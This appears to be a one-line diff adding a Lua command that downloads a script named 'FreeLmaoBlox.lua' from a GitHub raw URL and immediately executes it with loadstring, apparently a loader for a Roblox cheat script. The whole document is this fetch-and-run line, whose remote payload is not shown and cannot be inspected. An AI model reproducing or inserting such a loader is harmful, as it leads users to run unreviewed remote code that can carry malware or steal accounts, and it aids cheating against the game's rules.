@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/YGT72/YGT72/main/FreeLmaoBlox.lua'))()
